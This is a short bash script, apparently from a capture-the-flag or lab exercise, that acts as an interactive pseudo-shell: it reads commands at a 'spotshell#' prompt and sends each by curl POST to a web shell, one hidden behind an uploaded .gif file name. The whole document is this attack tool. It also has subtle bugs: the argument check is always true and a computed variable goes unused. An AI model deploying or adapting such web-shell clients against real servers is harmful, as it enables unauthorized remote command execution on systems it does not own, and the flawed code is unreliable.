#!/bin/bash
#http://10.10.10.67/webdav_test_inception/s.php

if [ $1='' ]; then
	url='http://192.168.2.141/upload/d885dd019005c7d0a804e017ddb7c3c9.gif'
else 
	url=$1
fi

echo [*] Using: $url

while true; do
read -p "spotshell#: " cmd
ncmd=`echo $cmd | sed 's/ /\+/'`
curl -d "cmd=$cmd" $url -X POST 2>&1
done;
